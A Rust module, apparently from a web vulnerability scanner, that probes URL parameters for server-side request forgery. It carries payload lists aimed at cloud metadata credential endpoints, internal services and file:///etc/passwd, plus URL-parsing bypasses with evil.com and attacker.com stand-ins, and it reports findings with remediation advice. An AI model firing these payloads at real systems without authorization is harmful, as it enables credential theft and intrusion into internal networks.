//! SSRF (Server-Side Request Forgery) testing
//!
//! Tests for SSRF vulnerabilities including:
//! - Internal network access
//! - Cloud metadata endpoints
//! - Protocol smuggling
//! - DNS rebinding preparation
//! - Blind SSRF detection

use anyhow::Result;

use crate::http::{HttpClient, Request};
use crate::scanner::findings::{Finding, Severity};

/// Cloud metadata endpoints (AWS, GCP, Azure, etc.)
const CLOUD_METADATA_URLS: &[(&str, &str, &str)] = &[
    // AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/", "ami-id", "AWS EC2 Metadata (IMDSv1)"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId", "AWS IAM Credentials"),
    ("http://169.254.169.254/latest/user-data", "", "AWS User Data"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "instanceId", "AWS Instance Identity"),

    // Google Cloud
    ("http://metadata.google.internal/computeMetadata/v1/", "attributes/", "GCP Metadata"),
    ("http://169.254.169.254/computeMetadata/v1/", "attributes/", "GCP Metadata (IP)"),

    // Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute", "Azure Instance Metadata"),

    // DigitalOcean
    ("http://169.254.169.254/metadata/v1/", "droplet", "DigitalOcean Metadata"),

    // Oracle Cloud
    ("http://169.254.169.254/opc/v1/instance/", "availabilityDomain", "Oracle Cloud Metadata"),

    // Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/", "instance-id", "Alibaba Cloud Metadata"),
];

/// Internal/localhost URLs to test
const INTERNAL_URLS: &[(&str, &str)] = &[
    // Localhost variations
    ("http://localhost/", "localhost"),
    ("http://127.0.0.1/", "127.0.0.1"),
    ("http://127.1/", "127.1"),
    ("http://0.0.0.0/", "0.0.0.0"),
    ("http://0/", "0"),
    ("http://[::1]/", "::1"),
    ("http://[0000::1]/", "0000::1"),

    // Common internal services
    ("http://localhost:22/", "SSH"),
    ("http://localhost:3306/", "MySQL"),
    ("http://localhost:5432/", "PostgreSQL"),
    ("http://localhost:6379/", "Redis"),
    ("http://localhost:27017/", "MongoDB"),
    ("http://localhost:11211/", "Memcached"),
    ("http://localhost:9200/", "Elasticsearch"),
    ("http://localhost:8080/", "Internal Web"),
    ("http://localhost:8000/", "Internal Web"),
    ("http://localhost:3000/", "Internal Web"),

    // Internal network ranges
    ("http://10.0.0.1/", "10.x.x.x"),
    ("http://172.16.0.1/", "172.16.x.x"),
    ("http://192.168.0.1/", "192.168.x.x"),
    ("http://192.168.1.1/", "192.168.1.x"),
];

/// Protocol smuggling URLs
const PROTOCOL_URLS: &[(&str, &str)] = &[
    ("file:///etc/passwd", "root:"),
    ("file:///etc/hosts", "localhost"),
    ("file:///C:/Windows/win.ini", "[fonts]"),
    ("dict://localhost:11211/stats", "STAT"),
    ("gopher://localhost:6379/_INFO", "redis_version"),
    ("ldap://localhost:389/", "LDAP"),
    ("sftp://localhost:22/", "SSH"),
];

/// URL bypass techniques
const BYPASS_TECHNIQUES: &[(&str, &str)] = &[
    // IP encoding bypasses
    ("http://2130706433/", "decimal IP for 127.0.0.1"),
    ("http://0x7f000001/", "hex IP for 127.0.0.1"),
    ("http://017700000001/", "octal IP for 127.0.0.1"),
    ("http://127.0.0.1.nip.io/", "DNS rebinding service"),
    ("http://spoofed.burpcollaborator.net/", "DNS rebinding"),

    // URL parsing bypasses
    ("http://localhost#@evil.com/", "URL fragment bypass"),
    ("http://localhost%00@evil.com/", "null byte bypass"),
    ("http://localhost%2523@evil.com/", "double encoding"),
    ("http://evil.com@localhost/", "basic auth confusion"),
    ("http://localhost:80\\@evil.com/", "backslash bypass"),
];

/// Parameter names commonly used for URLs
const URL_PARAMS: &[&str] = &[
    "url", "uri", "link", "src", "source", "href", "path", "file", "page",
    "document", "doc", "load", "read", "fetch", "get", "retrieve",
    "redirect", "return", "next", "continue", "target", "dest", "destination",
    "rurl", "return_url", "redirect_url", "callback", "data", "reference",
    "site", "host", "domain", "endpoint", "api", "proxy", "image", "img",
    "picture", "photo", "feed", "rss", "xml", "json", "content", "include",
];

/// Scan for SSRF vulnerabilities
pub async fn scan(client: &HttpClient, target_url: &str) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let url = url::Url::parse(target_url)?;
    let params: Vec<(String, String)> = url.query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    // Find URL-like parameters
    let url_params: Vec<&(String, String)> = params
        .iter()
        .filter(|(k, _)| {
            let key_lower = k.to_lowercase();
            URL_PARAMS.iter().any(|p| key_lower.contains(p))
        })
        .collect();

    // Also check for parameters that contain URL-like values
    let url_value_params: Vec<&(String, String)> = params
        .iter()
        .filter(|(_, v)| {
            v.starts_with("http://") || v.starts_with("https://") || v.starts_with("//")
        })
        .collect();

    let suspect_params: Vec<_> = url_params
        .into_iter()
        .chain(url_value_params)
        .collect();

    if suspect_params.is_empty() {
        return Ok(findings);
    }

    // Test cloud metadata endpoints
    for (param_name, _) in suspect_params.iter() {
        for (metadata_url, indicator, provider) in CLOUD_METADATA_URLS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        pairs.append_pair(k, metadata_url);
                    } else {
                        pairs.append_pair(k, v);
                    }
                }
            }

            let request = Request::new("GET", test_url.as_str());
            let response = match client.execute(&request).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = response.body_text();

            // Check for metadata indicators
            if !indicator.is_empty() && body.to_lowercase().contains(&indicator.to_lowercase()) {
                findings.push(
                    Finding::new("SSRF - Cloud Metadata Access", Severity::Critical, target_url)
                        .with_description(&format!(
                            "SSRF vulnerability allows access to {} endpoint. This may expose sensitive credentials and instance information.",
                            provider
                        ))
                        .with_parameter(param_name)
                        .with_evidence(&format!(
                            "Metadata URL: {}\nIndicator found: '{}'",
                            metadata_url, indicator
                        ))
                        .with_scanner("active/ssrf-cloud")
                        .with_cwe(918)
                        .with_owasp("A10:2021 – Server-Side Request Forgery")
                        .with_remediation(
                            "Implement URL allowlisting. Block requests to internal IP ranges and cloud metadata endpoints. Use network segmentation to restrict server egress."
                        )
                        .with_request(&format!("GET {}", test_url)),
                );

                return Ok(findings); // Critical finding, return immediately
            }
        }
    }

    // Test internal network access
    for (param_name, _) in suspect_params.iter() {
        for (internal_url, desc) in INTERNAL_URLS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        pairs.append_pair(k, internal_url);
                    } else {
                        pairs.append_pair(k, v);
                    }
                }
            }

            let request = Request::new("GET", test_url.as_str());
            let response = match client.execute(&request).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            // Check for signs of internal access
            let body = response.body_text();
            let status = response.status;

            // If we get a response that differs from normal error, might indicate SSRF
            if status == 200 || body.len() > 100 {
                // Check for common internal service banners
                let indicators = ["SSH", "Redis", "MySQL", "MongoDB", "nginx", "Apache", "IIS"];
                for indicator in indicators {
                    if body.contains(indicator) {
                        findings.push(
                            Finding::new("SSRF - Internal Network Access", Severity::High, target_url)
                                .with_description(&format!(
                                    "SSRF vulnerability allows access to internal network ({}). Service '{}' detected.",
                                    desc, indicator
                                ))
                                .with_parameter(param_name)
                                .with_evidence(&format!("Internal URL: {}", internal_url))
                                .with_scanner("active/ssrf-internal")
                                .with_cwe(918)
                                .with_owasp("A10:2021 – Server-Side Request Forgery")
                                .with_remediation(
                                    "Block requests to internal IP ranges. Implement strict URL validation and allowlisting."
                                ),
                        );

                        break;
                    }
                }
            }
        }
    }

    // Test protocol smuggling
    for (param_name, _) in suspect_params.iter() {
        for (protocol_url, indicator) in PROTOCOL_URLS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        pairs.append_pair(k, protocol_url);
                    } else {
                        pairs.append_pair(k, v);
                    }
                }
            }

            let request = Request::new("GET", test_url.as_str());
            let response = match client.execute(&request).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = response.body_text();

            if body.contains(indicator) {
                findings.push(
                    Finding::new("SSRF - Protocol Smuggling", Severity::High, target_url)
                        .with_description(&format!(
                            "SSRF vulnerability allows non-HTTP protocol access via '{}'.",
                            protocol_url.split(':').next().unwrap_or("unknown")
                        ))
                        .with_parameter(param_name)
                        .with_evidence(&format!("Protocol URL: {}", protocol_url))
                        .with_scanner("active/ssrf-protocol")
                        .with_cwe(918)
                        .with_remediation(
                            "Restrict allowed protocols to HTTP/HTTPS only. Validate URL scheme before making requests."
                        ),
                );

                break;
            }
        }
    }

    Ok(findings)
}

/// Test for blind SSRF using timing
pub async fn scan_blind_timing(
    client: &HttpClient,
    target_url: &str,
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let url = url::Url::parse(target_url)?;
    let params: Vec<(String, String)> = url.query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    // Find URL-like parameters
    let url_params: Vec<&(String, String)> = params
        .iter()
        .filter(|(k, _)| {
            let key_lower = k.to_lowercase();
            URL_PARAMS.iter().any(|p| key_lower.contains(p))
        })
        .collect();

    for (param_name, _) in url_params {
        // Test with a non-routable IP that will cause timeout
        let delay_url = "http://10.255.255.1:12345/"; // Non-routable, will timeout

        let mut test_url = url.clone();
        {
            let mut pairs = test_url.query_pairs_mut();
            pairs.clear();
            for (k, v) in &params {
                if k == param_name {
                    pairs.append_pair(k, delay_url);
                } else {
                    pairs.append_pair(k, v);
                }
            }
        }

        let request = Request::new("GET", test_url.as_str());
        let start = std::time::Instant::now();

        // Execute request (might timeout)
        let _ = tokio::time::timeout(
            std::time::Duration::from_secs(10),
            client.execute(&request),
        ).await;

        let elapsed = start.elapsed();

        // If request took significantly longer, might indicate SSRF
        if elapsed.as_secs() >= 5 {
            findings.push(
                Finding::new("Potential Blind SSRF (Timing)", Severity::Medium, target_url)
                    .with_description(&format!(
                        "Potential blind SSRF detected in parameter '{}'. Response delayed by {}s when targeting non-routable IP.",
                        param_name, elapsed.as_secs()
                    ))
                    .with_parameter(param_name)
                    .with_evidence(&format!("Delay: {}s (normal requests < 5s)", elapsed.as_secs()))
                    .with_scanner("active/ssrf-blind")
                    .with_cwe(918)
                    .with_remediation(
                        "Verify by testing with an out-of-band callback server (e.g., Burp Collaborator). Implement URL validation."
                    ),
            );
        }
    }

    Ok(findings)
}

/// Generate OOB callback URL for blind SSRF detection
pub fn generate_oob_payload(callback_domain: &str, identifier: &str) -> String {
    format!("http://{}.{}/ssrf", identifier, callback_domain)
}

/// Get common SSRF bypass variations for a URL
pub fn get_bypass_variations(target: &str) -> Vec<String> {
    let mut variations = Vec::new();

    // IP-based bypasses for localhost
    if target.contains("localhost") || target.contains("127.0.0.1") {
        variations.push(target.replace("localhost", "127.0.0.1"));
        variations.push(target.replace("localhost", "2130706433")); // Decimal
        variations.push(target.replace("localhost", "0x7f000001")); // Hex
        variations.push(target.replace("localhost", "127.1"));
        variations.push(target.replace("localhost", "0"));
        variations.push(target.replace("127.0.0.1", "localhost"));
    }

    // Double URL encoding
    variations.push(target.replace("://", "%3A%2F%2F"));

    // Add trailing characters
    variations.push(format!("{}#", target));
    variations.push(format!("{}?", target));
    variations.push(format!("{}/", target));

    variations
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cloud_metadata_urls() {
        assert!(!CLOUD_METADATA_URLS.is_empty());
        // AWS metadata should be included
        assert!(CLOUD_METADATA_URLS.iter().any(|(url, _, _)| url.contains("169.254.169.254")));
    }

    #[test]
    fn test_url_params() {
        assert!(URL_PARAMS.contains(&"url"));
        assert!(URL_PARAMS.contains(&"redirect"));
        assert!(URL_PARAMS.contains(&"callback"));
    }

    #[test]
    fn test_generate_oob_payload() {
        let payload = generate_oob_payload("attacker.com", "test123");
        assert!(payload.contains("attacker.com"));
        assert!(payload.contains("test123"));
        assert!(payload.contains("/ssrf"));
    }

    #[test]
    fn test_get_bypass_variations() {
        let variations = get_bypass_variations("http://localhost/admin");
        assert!(!variations.is_empty());
        assert!(variations.iter().any(|v| v.contains("127.0.0.1")));
    }

    #[test]
    fn test_protocol_urls() {
        assert!(!PROTOCOL_URLS.is_empty());
        assert!(PROTOCOL_URLS.iter().any(|(url, _)| url.starts_with("file://")));
        assert!(PROTOCOL_URLS.iter().any(|(url, _)| url.starts_with("gopher://")));
    }
}
